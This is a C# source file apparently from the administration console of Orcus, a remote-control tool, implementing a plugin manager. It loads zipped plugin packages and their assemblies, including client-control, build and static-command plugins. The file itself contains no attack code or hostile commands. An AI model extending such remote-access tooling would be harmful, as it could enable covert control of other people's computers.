using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Xml.Serialization;
using Exceptionless;
using NLog;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Command = Orcus.Administration.Plugins.CommandViewPlugin.Command;
using Logger = Orcus.Administration.Core.Logging.Logger;

namespace Orcus.Administration.Core.Plugins
{
    public class PluginManager
    {
        private static PluginManager _current;
        private bool _isInitialized;
        private readonly List<string> _loadedPluginAssemblies; 

        private PluginManager()
        {
            LoadedPlugins = new List<IPlugin>();
            _loadedPluginAssemblies = new List<string>();
        }

        public event EventHandler<IPlugin> PluginAdded;
        public event EventHandler<IPlugin> PluginRemoved;

        public static PluginManager Current => _current ?? (_current = new PluginManager());

        public List<IPlugin> LoadedPlugins { get; }

        public void Initialize()
        {
            if (_isInitialized)
                throw new InvalidOperationException();

            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomainOnAssemblyResolve;

            var pluginFolder = new DirectoryInfo("plugins");
            if (!pluginFolder.Exists)
                return;

            foreach (var fileInfo in pluginFolder.GetFiles("*.orcplg", SearchOption.TopDirectoryOnly))
            {
                IPlugin plugin;
                try
                {
                    plugin = LoadPlugin(fileInfo);
                }
                catch (Exception ex)
                {
                    Logger.Error(string.Format((string) Application.Current.Resources["CouldntLoadPlugin"],
                        fileInfo.Name, ex.Message));

                    var errorMessage = ex.ToString();

                    var typeLoadException = ex as ReflectionTypeLoadException;
                    if (typeLoadException != null)
                    {
                        var loaderExceptions = typeLoadException.LoaderExceptions;
                        errorMessage += string.Join("\r\n\r\n", loaderExceptions.Select(x => x.ToString()));
                    }
                    LogManager.GetCurrentClassLogger().Error("Failed to load plugin \"{0}\": {1}", fileInfo.Name, errorMessage);
                    ex.ToExceptionless().Submit();
                    continue;
                }

                LoadedPlugins.Add(plugin);
            }

            _isInitialized = true;
        }

        private Assembly CurrentDomainOnAssemblyResolve(object sender, ResolveEventArgs args)
        {
            //Important to implement a weak binding for plugins
            if (args.RequestingAssembly != null && _loadedPluginAssemblies.Contains(args.RequestingAssembly.FullName))
            {
                try
                {
                    var file = new FileInfo(args.Name.Split(',')[0] + ".dll");
                    if (!file.Exists)
                    {
                        file = new FileInfo(Path.Combine("libraries", file.Name));
                        if (!file.Exists)
                            return null;
                    }

                    return Assembly.LoadFile(file.FullName);
                }
                catch (Exception)
                {
                    return null;
                }
            }

            return null;
        }

        public void AddPlugin(string fileName)
        {
            var fileInfo = new FileInfo(fileName);
            var plugin = LoadPlugin(fileInfo);
            LoadedPlugins.Add(plugin);
            PluginAdded?.Invoke(this, plugin);
        }

        public void RemovePlugin(IPlugin plugin)
        {
            LoadedPlugins.Remove(plugin);
            PluginRemoved?.Invoke(this, plugin);
        }

        private IPlugin LoadPlugin(FileInfo file)
        {
            using (var fs = new FileStream(file.FullName, FileMode.Open, FileAccess.Read))
            using (var archive = new ZipArchive(fs, ZipArchiveMode.Read))
            {
                PluginInfo pluginInfo;
                using (var stream = archive.GetEntry("PluginInfo.xml").Open())
                {
                    var xmls = new XmlSerializer(typeof (PluginInfo));
                    pluginInfo = (PluginInfo) xmls.Deserialize(stream);
                }

                using (var assemblyStream = archive.GetEntry(pluginInfo.Library1).Open())
                using (var memoryStream = new MemoryStream())
                {
                    assemblyStream.CopyTo(memoryStream);
                    var assembly = Assembly.Load(memoryStream.ToArray());


                    _loadedPluginAssemblies.Add(assembly.FullName);

                    var types = assembly.GetTypes();
                    BitmapImage thumbnail = null;

                    if (!string.IsNullOrEmpty(pluginInfo.Thumbnail))
                    {
                        var entry = archive.GetEntry(pluginInfo.Thumbnail);
                        using (var thumbnailStream = entry.Open())
                            thumbnail = StreamToBitmapImage(thumbnailStream, (int) entry.Length);
                    }

                    switch (pluginInfo.PluginType)
                    {
                        case PluginType.Audio:
                            var audioType = types.First(x => x.GetInterface(nameof(IAudioPlugin)) != null);
                            return new AudioPlugin(file.FullName, pluginInfo, thumbnail,
                                (IAudioPlugin) Activator.CreateInstance(audioType));
                        case PluginType.Build:
                            var buildType = types.First(x => x.IsSubclassOf(typeof(BuildPluginBase)));
                            return new BuildPlugin(file.FullName, pluginInfo, thumbnail,
                                (BuildPluginBase) Activator.CreateInstance(buildType));
                        case PluginType.Client:
                            var clientType = types.First(x => x.IsSubclassOf(typeof (Orcus.Plugins.ClientController)));
                            return new ClientPlugin(file.FullName, pluginInfo, thumbnail,
                                (Orcus.Plugins.ClientController) Activator.CreateInstance(clientType));
                        case PluginType.CommandView:
                            var commandView = types.First(x => x.GetInterface(nameof(ICommandAndViewPlugin)) != null);
                            var commandViewInstance = (ICommandAndViewPlugin) Activator.CreateInstance(commandView);
                            var dummyCommand = (Command) Activator.CreateInstance(commandViewInstance.Command);
                            if (dummyCommand.Identifier <= 1000)
                                throw new Exception("The identifier of the plugin is below the limit");

                            var foo = (ICommandView) Activator.CreateInstance(commandViewInstance.CommandView);
                            if (foo == null)
                                throw new Exception("Command view could not be loaded");

                            return new CommandAndViewPlugin(file.FullName, pluginInfo, thumbnail, commandViewInstance,
                                dummyCommand.Identifier);
                        case PluginType.View:
                            var view = types.First(x => x.GetInterface(nameof(IViewPlugin)) != null);
                            return new ViewPlugin(file.FullName, pluginInfo, thumbnail,
                                (Administration.Plugins.IViewPlugin) Activator.CreateInstance(view));
                        case PluginType.Administration:
                            var administrationPlugin =
                                types.First(x => x.GetInterface(nameof(IAdministrationPlugin)) != null);
                            return new AdministrationPlugin(file.FullName, pluginInfo, thumbnail,
                                (IAdministrationPlugin) Activator.CreateInstance(administrationPlugin));
                        case PluginType.CommandFactory:
                            var factoryCommandType =
                                types.First(x => x.GetInterface(nameof(ICommandAndViewPlugin)) != null);
                            var factoryCommand = (ICommandAndViewPlugin) Activator.CreateInstance(factoryCommandType);
                            var dummyFactoryCommand = (Command) Activator.CreateInstance(factoryCommand.Command);
                            if (dummyFactoryCommand.Identifier <= 1000)
                                throw new Exception("The identifier of the plugin is below the limit");

                            var foo2 = (ICommandView) Activator.CreateInstance(factoryCommand.CommandView);
                            if (foo2 == null)
                                throw new Exception("Command view could not be loaded");

                            return new FactoryCommandPlugin(file.FullName, pluginInfo, thumbnail, factoryCommand,
                                dummyFactoryCommand.Identifier);
                        case PluginType.StaticCommand:
                            var staticCommandTypes = types.Where(x => x.IsSubclassOf(typeof (StaticCommand)) && x.GetConstructor(Type.EmptyTypes) != null).ToList();
                            memoryStream.Position = 0;
                            using (var md5 = new MD5CryptoServiceProvider())
                                return new StaticCommandPlugin(file.FullName, pluginInfo, thumbnail, staticCommandTypes,
                                    md5.ComputeHash(memoryStream));
                        default:
                            throw new ArgumentOutOfRangeException();
                    }
                }
            }
        }

        private static BitmapImage StreamToBitmapImage(Stream stream, int length)
        {
            var bitmap = new BitmapImage();

            var buffer = new byte[length];
            stream.Read(buffer, 0, length);

            using (var memoryStream = new MemoryStream(buffer))
            {
                bitmap.BeginInit();
                bitmap.CacheOption = BitmapCacheOption.OnLoad;
                bitmap.StreamSource = memoryStream;
                bitmap.EndInit();
            }
            bitmap.Freeze();

            return bitmap;
        }
    }
}